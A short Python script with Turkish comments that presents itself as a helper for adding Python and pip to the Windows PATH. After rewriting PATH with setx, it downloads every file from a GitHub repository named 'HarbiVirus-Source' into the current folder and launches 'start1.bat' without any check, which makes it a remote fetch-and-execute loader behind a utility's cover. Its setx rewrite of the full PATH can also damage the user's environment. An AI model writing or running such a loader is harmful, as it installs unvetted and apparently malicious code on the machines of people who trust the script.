import os
import requests
import sys

def add_to_path(directory):
    if directory not in os.environ["PATH"]:
        os.environ["PATH"] += os.pathsep + directory

def add_python_and_pip_to_path():
    python_dir = os.path.dirname(sys.executable)
    scripts_dir = os.path.join(python_dir, 'Scripts')
    
    # Python ve Scripts dizinlerini PATH'e ekle
    add_to_path(python_dir)
    add_to_path(scripts_dir)

    # PATH'i güncelle
    new_path = os.environ["PATH"]
    os.system(f'setx PATH "{new_path}"')

def clear_redundant_paths():
    # PATH değişkenini al
    path = os.environ["PATH"]
    # PATH'teki tekrar eden dizinleri kaldır
    path_list = list(dict.fromkeys(path.split(os.pathsep)))
    # Yeni PATH değeri oluştur
    new_path = os.pathsep.join(path_list)
    os.system(f'setx PATH "{new_path}"')

def download_files_from_github(repo_url):
    # GitHub API ile dosyaları listele
    response = requests.get(repo_url)
    files = response.json()

    # Dosyaları indir
    for file in files:
        if file['type'] == 'file':
            file_name = file['name']
            download_url = file['download_url']
            
            print(f"İndiriliyor: {file_name}")
            file_response = requests.get(download_url)

            # Dosyayı mevcut klasöre kaydet
            with open(file_name, 'wb') as f:
                f.write(file_response.content)

    print("Tüm dosyalar başarıyla indirildi!")

# GitHub repository URL
repo_url = "https://api.github.com/repos/Unknowndestroy/HarbiVirus-Source/contents/"

# Ana işlem
if __name__ == "__main__":
    # Python ve pip dizinlerini PATH'e ekle
    add_python_and_pip_to_path()
    clear_redundant_paths()
    print("Python ve Pip PATH'e eklendi ve tekrar eden dizinler temizlendi.")

    # GitHub'dan dosyaları indir (klasör oluşturulmadan, doğrudan mevcut klasöre)
    download_files_from_github(repo_url)
    
    print("Tüm dosyalar indirildi!")

    # START.py dosyasını başlat
    os.startfile("start1.bat")
    print("start1.bat başlatıldı.")
